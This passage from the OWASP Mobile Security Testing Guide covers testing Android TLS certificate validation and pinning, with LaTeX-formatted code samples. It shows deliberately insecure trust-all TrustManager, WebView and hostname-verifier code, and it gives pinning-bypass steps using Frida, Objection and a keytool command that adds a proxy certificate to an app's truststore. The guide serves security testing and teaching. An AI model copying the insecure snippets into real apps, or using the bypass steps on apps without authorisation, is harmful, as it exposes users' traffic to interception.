\end{itemize}

Make sure that the hostname and the certificate itself are verified
correctly. Examples and common pitfalls are available in the
\href{https://developer.android.com/training/articles/security-ssl.html}{official
Android documentation}. Search the code for examples of
\texttt{TrustManager} and \texttt{HostnameVerifier} usage. In the
sections below, you can find examples of the kind of insecure usage that
you should look for.

\begin{quote}
Note that from Android 8.0 (API level 26) onward, there is no support
for SSLv3 and \texttt{HttpsURLConnection} will no longer perform a
fallback to an insecure TLS/SSL protocol.
\end{quote}

\hypertarget{static-analysis-28}{%
\paragraph{Static Analysis}\label{static-analysis-28}}

\hypertarget{verifying-the-server-certificate}{%
\subparagraph{Verifying the Server
Certificate}\label{verifying-the-server-certificate}}

\texttt{TrustManager} is a means of verifying conditions necessary for
establishing a trusted connection in Android. The following conditions
should be checked at this point:

\begin{itemize}
\tightlist
\item
  Has the certificate been signed by a trusted CA?
\item
  Has the certificate expired?
\item
  Is the certificate self-signed?
\end{itemize}

The following code snippet is sometimes used during development and will
accept any certificate, overwriting the functions
\texttt{checkClientTrusted}, \texttt{checkServerTrusted}, and
\texttt{getAcceptedIssuers}. Such implementations should be avoided,
and, if they are necessary, they should be clearly separated from
production builds to avoid built-in security flaws.

\begin{Shaded}
\begin{Highlighting}[]
\BuiltInTok{TrustManager}\NormalTok{[] trustAllCerts = }\KeywordTok{new} \BuiltInTok{TrustManager}\NormalTok{[] \{}
    \KeywordTok{new} \BuiltInTok{X509TrustManager}\NormalTok{() \{}
        \AttributeTok{@Override}
        \KeywordTok{public} \BuiltInTok{X509Certificate}\NormalTok{[] }\FunctionTok{getAcceptedIssuers}\NormalTok{() \{}
            \KeywordTok{return} \KeywordTok{new}\NormalTok{ java.}\FunctionTok{security}\NormalTok{.}\FunctionTok{cert}\NormalTok{.}\FunctionTok{X509Certificate}\NormalTok{[] \{\};}
\NormalTok{        \}}

        \AttributeTok{@Override}
        \KeywordTok{public} \DataTypeTok{void} \FunctionTok{checkClientTrusted}\NormalTok{(}\BuiltInTok{X509Certificate}\NormalTok{[] chain, }\BuiltInTok{String}\NormalTok{ authType)}
            \KeywordTok{throws} \BuiltInTok{CertificateException}\NormalTok{ \{}
\NormalTok{        \}}

        \AttributeTok{@Override}
        \KeywordTok{public} \DataTypeTok{void} \FunctionTok{checkServerTrusted}\NormalTok{(}\BuiltInTok{X509Certificate}\NormalTok{[] chain, }\BuiltInTok{String}\NormalTok{ authType)}
            \KeywordTok{throws} \BuiltInTok{CertificateException}\NormalTok{ \{}
\NormalTok{        \}}
\NormalTok{    \}}
\NormalTok{ \};}

\CommentTok{// SSLContext context}
\NormalTok{context.}\FunctionTok{init}\NormalTok{(}\KeywordTok{null}\NormalTok{, trustAllCerts, }\KeywordTok{new} \BuiltInTok{SecureRandom}\NormalTok{());}
\end{Highlighting}
\end{Shaded}

\hypertarget{webview-server-certificate-verification}{%
\subparagraph{WebView Server Certificate
Verification}\label{webview-server-certificate-verification}}

Sometimes applications use a WebView to render the website associated
with the application. This is true of HTML/JavaScript-based frameworks
such as Apache Cordova, which uses an internal WebView for application
interaction. When a WebView is used, the mobile browser performs the
server certificate validation. Ignoring any TLS error that occurs when
the WebView tries to connect to the remote website is a bad practice.

The following code will ignore TLS issues, exactly like the
WebViewClient custom implementation provided to the WebView:

\begin{Shaded}
\begin{Highlighting}[]
\NormalTok{WebView myWebView = (WebView) }\FunctionTok{findViewById}\NormalTok{(R.}\FunctionTok{id}\NormalTok{.}\FunctionTok{webview}\NormalTok{);}
\NormalTok{myWebView.}\FunctionTok{setWebViewClient}\NormalTok{(}\KeywordTok{new} \FunctionTok{WebViewClient}\NormalTok{()\{}
    \AttributeTok{@Override}
    \KeywordTok{public} \DataTypeTok{void} \FunctionTok{onReceivedSslError}\NormalTok{(WebView view, SslErrorHandler handler, SslError error) \{}
        \CommentTok{//Ignore TLS certificate errors and instruct the WebViewClient to load the website}
\NormalTok{        handler.}\FunctionTok{proceed}\NormalTok{();}
\NormalTok{    \}}
\NormalTok{\});}
\end{Highlighting}
\end{Shaded}

\hypertarget{apache-cordova-certificate-verification}{%
\subparagraph{Apache Cordova Certificate
Verification}\label{apache-cordova-certificate-verification}}

Implementation of the Apache Cordova framework's internal WebView usage
will ignore
\href{https://github.com/apache/cordova-android/blob/master/framework/src/org/apache/cordova/engine/SystemWebViewClient.java}{TLS
errors} in the method \texttt{onReceivedSslError} if the flag
\texttt{android:debuggable} is enabled in the application manifest.
Therefore, make sure that the app is not debuggable. See the test case
``Testing If the App is Debuggable''.

\hypertarget{hostname-verification}{%
\subparagraph{Hostname Verification}\label{hostname-verification}}

Another security flaw in client-side TLS implementations is the lack of
hostname verification. Development environments usually use internal
addresses instead of valid domain names, so developers often disable
hostname verification (or force an application to allow any hostname)
and simply forget to change it when their application goes to
production. The following code disables hostname verification:

\begin{Shaded}
\begin{Highlighting}[]
\DataTypeTok{final} \DataTypeTok{static} \BuiltInTok{HostnameVerifier}\NormalTok{ NO\_VERIFY = }\KeywordTok{new} \BuiltInTok{HostnameVerifier}\NormalTok{() \{}
    \KeywordTok{public} \DataTypeTok{boolean} \FunctionTok{verify}\NormalTok{(}\BuiltInTok{String}\NormalTok{ hostname, }\BuiltInTok{SSLSession}\NormalTok{ session) \{}
        \KeywordTok{return} \KeywordTok{true}\NormalTok{;}
\NormalTok{    \}}
\NormalTok{\};}
\end{Highlighting}
\end{Shaded}

With a built-in \texttt{HostnameVerifier}, accepting any hostname is
possible:

\begin{Shaded}
\begin{Highlighting}[]
\BuiltInTok{HostnameVerifier}\NormalTok{ NO\_VERIFY = org.}\FunctionTok{apache}\NormalTok{.}\FunctionTok{http}\NormalTok{.}\FunctionTok{conn}\NormalTok{.}\FunctionTok{ssl}\NormalTok{.}\FunctionTok{SSLSocketFactory}
\NormalTok{                             .}\FunctionTok{ALLOW\_ALL\_HOSTNAME\_VERIFIER}\NormalTok{;}
\end{Highlighting}
\end{Shaded}

Make sure that your application verifies a hostname before setting a
trusted connection.

\hypertarget{dynamic-analysis-25}{%
\paragraph{Dynamic Analysis}\label{dynamic-analysis-25}}

Dynamic analysis requires an interception proxy. To test improper
certificate verification, check the following controls:

\begin{itemize}
\tightlist
\item
  Self-signed certificate
\end{itemize}

In Burp, go to the \textbf{Proxy} tab, select the \textbf{Options} tab,
then go to the \textbf{Proxy Listeners} section, highlight your
listener, and click \textbf{Edit}. Then go to the \textbf{Certificate}
tab, check \textbf{Use a self-signed certificate}, and click
\textbf{Ok}. Now, run your application. If you're able to see HTTPS
traffic, your application is accepting self-signed certificates.

\begin{itemize}
\tightlist
\item
  Accepting certificates with an untrusted CA
\end{itemize}

In Burp, go to the \textbf{Proxy} tab, select the \textbf{Options} tab,
then go to the \textbf{Proxy Listeners} section, highlight your
listener, and click \textbf{Edit}. Then go to the \textbf{Certificate}
tab, check \textbf{Generate a CA-signed certificate with a specific
hostname}, and type in the backend server's hostname. Now, run your
application. If you're able to see HTTPS traffic, your application is
accepting certificates with an untrusted CA.

\begin{itemize}
\tightlist
\item
  Accepting incorrect hostnames
\end{itemize}

In Burp,go to the \textbf{Proxy} tab, select the \textbf{Options} tab,
then go to the \textbf{Proxy Listeners} section, highlight your
listener, and click \textbf{Edit}. Then go to the \textbf{Certificate}
tab, check \textbf{Generate a CA-signed certificate with a specific
hostname}, and type in an invalid hostname, e.g., example.org. Now, run
your application. If you're able to see HTTPS traffic, your application
is accepting all hostnames.

If you're interested in further MITM analysis or you have problems with
the configuration of your interception proxy, consider using
\href{https://insights.sei.cmu.edu/cert/2014/08/-announcing-cert-tapioca-for-mitm-analysis.html}{Tapioca}.
It's a CERT pre-configured
\href{http://www.cert.org/download/mitm/CERT_Tapioca.ova}{VM appliance}
for MITM software analysis. All you have to do is
\href{https://insights.sei.cmu.edu/cert/2014/09/-finding-android-ssl-vulnerabilities-with-cert-tapioca.html}{deploy
a tested application on an emulator and start capturing traffic}.

\hypertarget{testing-custom-certificate-stores-and-certificate-pinning-mstg-network-4}{%
\subsubsection{Testing Custom Certificate Stores and Certificate Pinning
(MSTG-NETWORK-4)}\label{testing-custom-certificate-stores-and-certificate-pinning-mstg-network-4}}

\hypertarget{overview-21}{%
\paragraph{Overview}\label{overview-21}}

Certificate pinning is the process of associating the backend server
with a particular X.509 certificate or public key instead of accepting
any certificate signed by a trusted certificate authority. After storing
(``pinning'') the server certificate or public key, the mobile app will
subsequently connect to the known server only. Withdrawing trust from
external certificate authorities reduces the attack surface (after all,
there are many cases of certificate authorities that have been
compromised or tricked into issuing certificates to impostors).

The certificate can be pinned and hardcoded into the app or retrieved at
the time the app first connects to the backend. In the latter case, the
certificate is associated with (``pinned'' to) the host when the host is
seen for the first time. This alternative is less secure because
attackers intercepting the initial connection can inject their own
certificates.

\hypertarget{when-the-pin-fails}{%
\subparagraph{When the Pin Fails}\label{when-the-pin-fails}}

Note that there are various options when dealing with a failing pin:

\begin{itemize}
\tightlist
\item
  Inform the user about not being able to connect to the backend and
  stop all operations. The app can check whether there is an update and
  inform the user about updating to the latest version of the app if
  available. The app allows no longer for any form of interaction with
  the user until it is updated or the pin works again.
\item
  Do a call to a crash-reporting service including information about the
  failed pin. The responsible developers should get notified about a
  potential security misconfiguration.
\item
  The app calls the backend using a TLS enabled call with no pinning to
  inform the backend of a pinning failure. The call can either differ in
  user-agent, JWT token-contents, or have other headers with a flag
  enabled as an indication of pinning failure.
\item
  After calling the backend or crash-reporting service to notify about
  the failing pinning, the app can still offer limited functionality
  that shouldn't involve sensitive functions or processing of sensitive
  data. The communication would happen without SSL Pinning and just
  validate the X.509 certificate accordingly.
\end{itemize}

Which option(s) you choose depends on how important availability is
compared to the complexity of maintaining the application.

When a large amount of pinfailures are reported to the backend or
crash-reporting service, the developer should understand that there is
probably a misconfiguration. There is a large chance that the key
materials used at the TLS terminating endpoint
(e.g.~server/loadbalancer) is different than what the app is expecting.
In that case, an update of either that key material or an update of the
app should be pushed through.

When only very few pin failures are reported, then the network should be
ok, and so should be the configuration of the TLS terminating endpoint.
Instead, it might well be that there is a man-in-the-middle attack
ongoing at the app instance of which the pin is failing.

\hypertarget{static-analysis-29}{%
\paragraph{Static Analysis}\label{static-analysis-29}}

\hypertarget{network-security-configuration}{%
\subparagraph{Network Security
Configuration}\label{network-security-configuration}}

To customize their network security settings in a safe, declarative
configuration file without modifying app code, applications can use the
\href{https://developer.android.com/training/articles/security-config.html}{Network
Security Configuration} that Android provides for versions 7.0 and
above.

The Network Security Configuration can also be used to pin
\href{https://developer.android.com/training/articles/security-config.html\#CertificatePinning}{declarative
certificates} to specific domains. If an application uses this feature,
two things should be checked to identify the defined configuration:

First, find the Network Security Configuration file in the Android
application manifest via the \texttt{android:networkSecurityConfig}
attribute on the application tag:

\begin{Shaded}
\begin{Highlighting}[]
\KeywordTok{<?xml}\NormalTok{ version="1.0" encoding="utf{-}8"}\KeywordTok{?>}
\KeywordTok{<manifest}\OtherTok{ xmlns:android=}\StringTok{"http://schemas.android.com/apk/res/android"}\OtherTok{ package=}\StringTok{"owasp.com.app"}\KeywordTok{>}
    \KeywordTok{<application}\OtherTok{ android:networkSecurityConfig=}\StringTok{"@xml/network\_security\_config"}\KeywordTok{>}
\NormalTok{        ...}
    \KeywordTok{</application>}
\KeywordTok{</manifest>}
\end{Highlighting}
\end{Shaded}

Open the identified file. In this case, the file can be found at
``res/xml/network\_security\_config.xml'':

\begin{Shaded}
\begin{Highlighting}[]
\KeywordTok{<?xml}\NormalTok{ version="1.0" encoding="utf{-}8"}\KeywordTok{?>}
\KeywordTok{<network{-}security{-}config>}
    \KeywordTok{<domain{-}config>}
        \CommentTok{<!{-}{-} Use certificate pinning for OWASP website access including sub domains {-}{-}>}
        \KeywordTok{<domain}\OtherTok{ includeSubdomains=}\StringTok{"true"}\KeywordTok{>}\NormalTok{owasp.org}\KeywordTok{</domain>}
        \KeywordTok{<pin{-}set}\OtherTok{ expiration=}\StringTok{"2018/8/10"}\KeywordTok{>}
            \CommentTok{<!{-}{-} Hash of the public key (SubjectPublicKeyInfo of the X.509 certificate) of}
\CommentTok{            the Intermediate CA of the OWASP website server certificate {-}{-}>}
            \KeywordTok{<pin}\OtherTok{ digest=}\StringTok{"SHA{-}256"}\KeywordTok{>}\NormalTok{YLh1dUR9y6Kja30RrAn7JKnbQG/uEtLMkBgFF2Fuihg=}\KeywordTok{</pin>}
            \CommentTok{<!{-}{-} Hash of the public key (SubjectPublicKeyInfo of the X.509 certificate) of}
\CommentTok{            the Root CA of the OWASP website server certificate {-}{-}>}
            \KeywordTok{<pin}\OtherTok{ digest=}\StringTok{"SHA{-}256"}\KeywordTok{>}\NormalTok{Vjs8r4z+80wjNcr1YKepWQboSIRi63WsWXhIMN+eWys=}\KeywordTok{</pin>}
        \KeywordTok{</pin{-}set>}
    \KeywordTok{</domain{-}config>}
\KeywordTok{</network{-}security{-}config>}
\end{Highlighting}
\end{Shaded}

\begin{quote}
The pin-set contains a set of public key pins. Each set can define an
expiration date. When the expiration date is reached, the network
communication will continue to work, but the Certificate Pinning will be
disabled for the affected domains.
\end{quote}

If a configuration exists, the following event may be visible in the
log:

\begin{verbatim}
D/NetworkSecurityConfig: Using Network Security Config from resource network_security_config
\end{verbatim}

If a certificate pinning validation check has failed, the following
event will be logged:

\begin{verbatim}
I/X509Util: Failed to validate the certificate chain, error: Pin verification failed
\end{verbatim}

Using a decompiler (e.g.~jadx or apktool) we will be able to confirm if
the \texttt{\textless{}pin\textgreater{}} entry is present in the
network\_security\_config.xml file located in the /res/xml/ folder.

\hypertarget{trustmanager}{%
\subparagraph{TrustManager}\label{trustmanager}}

Implementing certificate pinning involves three main steps:

\begin{itemize}
\tightlist
\item
  Obtain the certificate of the desired host(s).
\item
  Make sure the certificate is in .bks format.
\item
  Pin the certificate to an instance of the default Apache Httpclient.
\end{itemize}

To analyze the correct implementation of certificate pinning, the HTTP
client should load the KeyStore:

\begin{Shaded}
\begin{Highlighting}[]
\BuiltInTok{InputStream}\NormalTok{ in = resources.}\FunctionTok{openRawResource}\NormalTok{(certificateRawResource);}
\NormalTok{keyStore = }\BuiltInTok{KeyStore}\NormalTok{.}\FunctionTok{getInstance}\NormalTok{(}\StringTok{"BKS"}\NormalTok{);}
\NormalTok{keyStore.}\FunctionTok{load}\NormalTok{(resourceStream, password);}
\end{Highlighting}
\end{Shaded}

Once the KeyStore has been loaded, we can use the TrustManager that
trusts the CAs in our KeyStore:

\begin{Shaded}
\begin{Highlighting}[]
\BuiltInTok{String}\NormalTok{ tmfAlgorithm = }\BuiltInTok{TrustManagerFactory}\NormalTok{.}\FunctionTok{getDefaultAlgorithm}\NormalTok{();}
\BuiltInTok{TrustManagerFactory}\NormalTok{ tmf = }\BuiltInTok{TrustManagerFactory}\NormalTok{.}\FunctionTok{getInstance}\NormalTok{(tmfAlgorithm);}
\NormalTok{tmf.}\FunctionTok{init}\NormalTok{(keyStore);}
\CommentTok{// Create an SSLContext that uses the TrustManager}
\CommentTok{// SSLContext context = SSLContext.getInstance("TLS");}
\NormalTok{sslContext.}\FunctionTok{init}\NormalTok{(}\KeywordTok{null}\NormalTok{, tmf.}\FunctionTok{getTrustManagers}\NormalTok{(), }\KeywordTok{null}\NormalTok{);}
\end{Highlighting}
\end{Shaded}

The app's implementation may be different, pinning against the
certificate's public key only, the whole certificate, or a whole
certificate chain.

\hypertarget{network-libraries-and-webviews}{%
\subparagraph{Network Libraries and
WebViews}\label{network-libraries-and-webviews}}

Applications that use third-party networking libraries may utilize the
libraries' certificate pinning functionality. For example,
\href{https://github.com/square/okhttp/wiki/HTTPS}{okhttp} can be set up
with the \texttt{CertificatePinner} as follows:

\begin{Shaded}
\begin{Highlighting}[]
\NormalTok{OkHttpClient client = }\KeywordTok{new}\NormalTok{ OkHttpClient.}\FunctionTok{Builder}\NormalTok{()}
\NormalTok{        .}\FunctionTok{certificatePinner}\NormalTok{(}\KeywordTok{new}\NormalTok{ CertificatePinner.}\FunctionTok{Builder}\NormalTok{()}
\NormalTok{            .}\FunctionTok{add}\NormalTok{(}\StringTok{"example.com"}\NormalTok{, }\StringTok{"sha256/UwQAapahrjCOjYI3oLUx5AQxPBR02Jz6/E2pt0IeLXA="}\NormalTok{)}
\NormalTok{            .}\FunctionTok{build}\NormalTok{())}
\NormalTok{        .}\FunctionTok{build}\NormalTok{();}
\end{Highlighting}
\end{Shaded}

Applications that use a WebView component may utilize the
WebViewClient's event handler for some kind of ``certificate pinning''
of each request before the target resource is loaded. The following code
shows an example verification:

\begin{Shaded}
\begin{Highlighting}[]
\NormalTok{WebView myWebView = (WebView) }\FunctionTok{findViewById}\NormalTok{(R.}\FunctionTok{id}\NormalTok{.}\FunctionTok{webview}\NormalTok{);}
\NormalTok{myWebView.}\FunctionTok{setWebViewClient}\NormalTok{(}\KeywordTok{new} \FunctionTok{WebViewClient}\NormalTok{()\{}
    \KeywordTok{private} \BuiltInTok{String}\NormalTok{ expectedIssuerDN = }\StringTok{"CN=Let\textquotesingle{}s Encrypt Authority X3,O=Let\textquotesingle{}s Encrypt,C=US;"}\NormalTok{;}

    \AttributeTok{@Override}
    \KeywordTok{public} \DataTypeTok{void} \FunctionTok{onLoadResource}\NormalTok{(WebView view, }\BuiltInTok{String}\NormalTok{ url)  \{}
        \CommentTok{//From Android API documentation about "WebView.getCertificate()":}
        \CommentTok{//Gets the SSL certificate for the main top{-}level page}
        \CommentTok{//or null if there is no certificate (the site is not secure).}
        \CommentTok{//}
        \CommentTok{//Available information on SslCertificate class are "Issuer DN", "Subject DN" and validity date helpers}
\NormalTok{        SslCertificate serverCert = view.}\FunctionTok{getCertificate}\NormalTok{();}
        \KeywordTok{if}\NormalTok{(serverCert != }\KeywordTok{null}\NormalTok{)\{}
            \CommentTok{//apply either certificate or public key pinning comparison here}
                \CommentTok{//Throw exception to cancel resource loading...}
\NormalTok{            \}}
\NormalTok{        \}}
\NormalTok{    \}}
\NormalTok{\});}
\end{Highlighting}
\end{Shaded}

Alternatively, it is better to use an OkHttpClient with configured pins
and let it act as a proxy overriding \texttt{shouldInterceptRequest} of
the \texttt{WebViewClient}.

\hypertarget{xamarin-applications}{%
\subparagraph{Xamarin Applications}\label{xamarin-applications}}

Applications developed in Xamarin will typically use ServicePointManager
to implement pinning.

Normally a function is created to check the certificate(s) and return
the boolean value to the method ServerCertificateValidationCallback:

\begin{Shaded}
\begin{Highlighting}[]
\NormalTok{[}\FunctionTok{Activity}\NormalTok{(Label = }\StringTok{"XamarinPinning"}\NormalTok{, MainLauncher = }\KeywordTok{true}\NormalTok{)]}
    \KeywordTok{public} \KeywordTok{class}\NormalTok{ MainActivity : Activity}
\NormalTok{    \{}
        \CommentTok{// SupportedPublicKey {-} Hexadecimal value of the public key.}
        \CommentTok{// Use GetPublicKeyString() method to determine the public key of the certificate we want to pin. Uncomment the debug code in the ValidateServerCertificate function a first time to determine the value to pin.}
        \KeywordTok{private} \DataTypeTok{const} \DataTypeTok{string}\NormalTok{ SupportedPublicKey = }\StringTok{"3082010A02820101009CD30CF05AE52E47B7725D3783B3686330EAD735261925E1BDBE35F170922FB7B84B4105ABA99E350858ECB12AC468870BA3E375E4E6F3A76271BA7981601FD7919A9FF3D0786771C8690E9591CFFEE699E9603C48CC7ECA4D7712249D471B5AEBB9EC1E37001C9CAC7BA705EACE4AEBBD41E53698B9CBFD6D3C9668DF232A42900C867467C87FA59AB8526114133F65E98287CBDBFA0E56F68689F3853F9786AFB0DC1AEF6B0D95167DC42BA065B299043675806BAC4AF31B9049782FA2964F2A20252904C674C0D031CD8F31389516BAA833B843F1B11FC3307FA27931133D2D36F8E3FCF2336AB93931C5AFC48D0D1D641633AAFA8429B6D40BC0D87DC3930203010001"}\NormalTok{;}

        \KeywordTok{private} \KeywordTok{static} \DataTypeTok{bool} \FunctionTok{ValidateServerCertificate}\NormalTok{(}
                \DataTypeTok{object}\NormalTok{ sender,}
\NormalTok{                X509Certificate certificate,}
\NormalTok{                X509Chain chain,}
\NormalTok{                SslPolicyErrors sslPolicyErrors}
\NormalTok{            )}
\NormalTok{        \{}
            \CommentTok{//Log.Debug("Xamarin Pinning",chain.ChainElements[X].Certificate.GetPublicKeyString());}
            \CommentTok{//return true;}
            \KeywordTok{return}\NormalTok{ SupportedPublicKey == chain.}\FunctionTok{ChainElements}\NormalTok{[}\DecValTok{1}\NormalTok{].}\FunctionTok{Certificate}\NormalTok{.}\FunctionTok{GetPublicKeyString}\NormalTok{();}
\NormalTok{        \}}

        \KeywordTok{protected} \KeywordTok{override} \DataTypeTok{void} \FunctionTok{OnCreate}\NormalTok{(Bundle savedInstanceState)}
\NormalTok{        \{}
\NormalTok{            System.}\FunctionTok{Net}\NormalTok{.}\FunctionTok{ServicePointManager}\NormalTok{.}\FunctionTok{ServerCertificateValidationCallback}\NormalTok{ += ValidateServerCertificate;}
            \KeywordTok{base}\NormalTok{.}\FunctionTok{OnCreate}\NormalTok{(savedInstanceState);}
            \FunctionTok{SetContentView}\NormalTok{(Resource.}\FunctionTok{Layout}\NormalTok{.}\FunctionTok{Main}\NormalTok{);}
            \FunctionTok{TesteAsync}\NormalTok{(}\StringTok{"https://security.claudio.pt"}\NormalTok{);}

\NormalTok{        \}}
\end{Highlighting}
\end{Shaded}

In this particular example we are pinning the intermediate CA of the
certificate chain. The output of the HTTP response will be available in
the system logs.

Sample Xamarin app with the previous example can be obtained on the
\href{https://github.com/OWASP/owasp-mstg/raw/master/Samples/Android/02_CertificatePinning/certificatePinningXamarin.apk}{MSTG
repository}

After decompressing the APK file, use a .NET decompiler like dotPeak,
ILSpy or dnSpy to decompile the app dlls stored inside the `Assemblies'
folder and confirm the usage of the ServicePointManager.

\hypertarget{cordova-applications}{%
\subparagraph{Cordova Applications}\label{cordova-applications}}

Hybrid applications based on Cordova do not support Certificate Pinning
natively, so plugins are used to achieve this. The most common one is
PhoneGap SSL Certificate Checker. The \texttt{check} method is used to
confirm the fingerprint and callbacks will determine the next steps.

\begin{Shaded}
\begin{Highlighting}[]
  \CommentTok{// Endpoint to verify against certificate pinning.}
  \KeywordTok{var}\NormalTok{ server }\OperatorTok{=} \StringTok{"https://www.owasp.org"}\OperatorTok{;}
  \CommentTok{// SHA256 Fingerprint (Can be obtained via "openssl s\_client {-}connect hostname:443 | openssl x509 {-}noout {-}fingerprint {-}sha256"}
  \KeywordTok{var}\NormalTok{ fingerprint }\OperatorTok{=} \StringTok{"D8 EF 3C DF 7E F6 44 BA 04 EC D5 97 14 BB 00 4A 7A F5 26 63 53 87 4E 76 67 77 F0 F4 CC ED 67 B9"}\OperatorTok{;}

  \VariableTok{window}\NormalTok{.}\VariableTok{plugins}\NormalTok{.}\VariableTok{sslCertificateChecker}\NormalTok{.}\AttributeTok{check}\NormalTok{(}
\NormalTok{          successCallback}\OperatorTok{,}
\NormalTok{          errorCallback}\OperatorTok{,}
\NormalTok{          server}\OperatorTok{,}
\NormalTok{          fingerprint)}\OperatorTok{;}

   \KeywordTok{function} \AttributeTok{successCallback}\NormalTok{(message) }\OperatorTok{\{}
     \AttributeTok{alert}\NormalTok{(message)}\OperatorTok{;}
     \CommentTok{// Message is always: CONNECTION\_SECURE.}
     \CommentTok{// Now do something with the trusted server.}
   \OperatorTok{\}}

   \KeywordTok{function} \AttributeTok{errorCallback}\NormalTok{(message) }\OperatorTok{\{}
     \AttributeTok{alert}\NormalTok{(message)}\OperatorTok{;}
     \ControlFlowTok{if}\NormalTok{ (message }\OperatorTok{===} \StringTok{"CONNECTION\_NOT\_SECURE"}\NormalTok{) }\OperatorTok{\{}
       \CommentTok{// There is likely a man in the middle attack going on, be careful!}
     \OperatorTok{\}} \ControlFlowTok{else} \ControlFlowTok{if}\NormalTok{ (}\VariableTok{message}\NormalTok{.}\AttributeTok{indexOf}\NormalTok{(}\StringTok{"CONNECTION\_FAILED"}\NormalTok{) }\OperatorTok{>{-}} \DecValTok{1}\NormalTok{) }\OperatorTok{\{}
       \CommentTok{// There was no connection (yet). Internet may be down. Try again (a few times) after a little timeout.}
     \OperatorTok{\}}
   \OperatorTok{\}}
\end{Highlighting}
\end{Shaded}

After decompressing the APK file, Cordova/Phonegap files will be located
in the /assets/www folder. The `plugins' folder will give you the
visibility of the plugins used. We will need to search for this methods
in the JavaScript code of the application to confirm its usage.

\hypertarget{dynamic-analysis-26}{%
\paragraph{Dynamic Analysis}\label{dynamic-analysis-26}}

Dynamic analysis can be performed by launching a MITM attack with your
preferred interception proxy. This will allow you to monitor the traffic
between the client (the mobile application) and the backend server. If
the proxy is unable to intercept the HTTP requests and responses, the
SSL pinning has been implemented correctly.

\hypertarget{bypassing-certificate-pinning}{%
\subparagraph{Bypassing Certificate
Pinning}\label{bypassing-certificate-pinning}}

There are several ways to bypass certificate pinning for a black box
test, depending on the frameworks available on the device:

\begin{itemize}
\tightlist
\item
  Cydia Substrate: Install the
  \href{https://github.com/iSECPartners/Android-SSL-TrustKiller}{Android-SSL-TrustKiller}
  package.
\item
  Frida: Use the
  \href{https://codeshare.frida.re/@pcipolloni/universal-android-ssl-pinning-bypass-with-frida/}{Universal
  Android SSL Pinning Bypass with Frida} script.
\item
  Objection: Use the \texttt{android\ sslpinning\ disable} command.
\item
  Xposed: Install the
  \href{https://github.com/ViRb3/TrustMeAlready}{TrustMeAlready} or
  \href{https://github.com/ac-pm/SSLUnpinning_Xposed}{SSLUnpinning}
  module.
\end{itemize}

For most applications, certificate pinning can be bypassed within
seconds, but only if the app uses the API functions that are covered by
these tools. If the app is implementing SSL Pinning with a custom
framework or library, the SSL Pinning must be manually patched and
deactivated, which can be time-consuming.

Bypass Custom Certificate Pinning Statically

Somewhere in the application, both the endpoint and the certificate (or
its hash) must be defined. After decompiling the application, you can
search for:

\begin{itemize}
\tightlist
\item
  Certificate hashes:
  \texttt{grep\ -ri\ "sha256\textbackslash{}\textbar{}sha1"\ ./smali}.
  Replace the identified hashes with the hash of your proxy's CA.
  Alternatively, if the hash is accompanied by a domain name, you can
  try modifying the domain name to a non-existing domain so that the
  original domain is not pinned. This works well on obfuscated OkHTTP
  implementations.
\item
  Certificate files:
  \texttt{find\ ./assets\ -type\ f\ \textbackslash{}(\ -iname\ \textbackslash{}*.cer\ -o\ -iname\ \textbackslash{}*.crt\ \textbackslash{})}.
  Replace these files with your proxy's certificates, making sure they
  are in the correct format.
\item
  Truststore files:
  \texttt{find\ ./\ -type\ f\ \textbackslash{}(\ -iname\ \textbackslash{}*.jks\ -o\ -iname\ \textbackslash{}*.bks\ \textbackslash{})}.
  Add your proxy's certificates to the trustore and make sure they are
  in the correct format.
\end{itemize}

\begin{quote}
Keep in mind that an app might contain files without extension. The most
common file locations are \texttt{assets} and \texttt{res} directories,
which should also be investigated.
\end{quote}

As an example, let's say that you find an application which uses a BKS
(BouncyCastle) truststore and it's stored in the file
\texttt{res/raw/truststore.bks}. To bypass SSL Pinning you need to add
your proxy's certificate to the truststore with the command line tool
\texttt{keytool}. \texttt{Keytool} comes with the Java SDK and the
following values are needed to execute the command:

\begin{itemize}
\tightlist
\item
  password - Password for the keystore. Look in the decompiled app code
  for the hardcoded password.
\item
  providerpath - Location of the BouncyCastle Provider jar file. You can
  download it from
  \href{https://www.bouncycastle.org/latest_releases.html}{The Legion of
  the Bouncy Castle}.
\item
  proxy.cer - Your proxy's certificate.
\item
  aliascert - Unique value which will be used as alias for your proxy's
  certificate.
\end{itemize}

To add your proxy's certificate use the following command:

\begin{verbatim}
$ keytool -importcert -v -trustcacerts -file proxy.cer -alias aliascert -keystore "res/raw/truststore.bks" -provider org.bouncycastle.jce.provider.BouncyCastleProvider -providerpath "providerpath/bcprov-jdk15on-164.jar" -storetype BKS -storepass password
\end{verbatim}

To list certificates in the BKS truststore use the following command:

\begin{verbatim}
$ keytool -list -keystore "res/raw/truststore.bks" -provider org.bouncycastle.jce.provider.BouncyCastleProvider -providerpath "providerpath/bcprov-jdk15on-164.jar"  -storetype BKS -storepass password
\end{verbatim}

After making these modifications, repackage the application using
apktool and install it on your device.

If the application uses native libraries to implement network
communication, further reverse engineering is needed. An example of such
an approach can be found in the blog post
\href{https://serializethoughts.wordpress.com/2016/08/18/bypassing-ssl-pinning-in-android-applications/}{Identifying
the SSL Pinning logic in smali code, patching it, and reassembling the
APK}

Bypass Custom Certificate Pinning Dynamically

Bypassing the pinning logic dynamically makes it more convenient as
there is no need to bypass any integrity checks and it's much faster to
perform trial \& error attempts.

Finding the correct method to hook is typically the hardest part and can
take quite some time depending on the level of obfuscation. As
developers typically reuse existing libraries, it is a good approach to
search for strings and license files that identify the used library.
Once the library has been identified, examine the non-obfuscated source
code to find methods which are suited for dynamic instrumentation.

As an example, let's say that you find an application which uses an
obfuscated OkHTTP3 library. The
\href{https://square.github.io/okhttp/3.x/okhttp/}{documentation} shows
that the CertificatePinner.Builder class is responsible for adding pins
for specific domains. If you can modify the arguments to the
\href{https://square.github.io/okhttp/3.x/okhttp/okhttp3/CertificatePinner.Builder.html\#add-java.lang.String-java.lang.String...-}{Builder.add
method}, you can change the hashes to the correct hashes belonging to
your certificate. Finding the correct method can be done in either two
ways:

\begin{itemize}
\tightlist
\item
  Search for hashes and domain names as explained in the previous
  section. The actual pinning method will typically be used or defined
  in close proximity to these strings
\item
  Search for the method signature in the SMALI code
\end{itemize}

For the Builder.add method, you can find the possible methods by running
the following grep command:
\texttt{grep\ -ri\ java/lang/String;\textbackslash{}{[}Ljava/lang/String;)L\ ./}

This command will search for all methods that take a string and a
variable list of strings as arguments, and return a complex object.
Depending on the size of the application, this may have one or multiple
matches in the code.

Hook each method with Frida and print the arguments. One of them will
print out a domain name and a certificate hash, after which you can
modify the arguments to circumvent the implemented pinning.

\hypertarget{testing-the-network-security-configuration-settings-mstg-network-4}{%
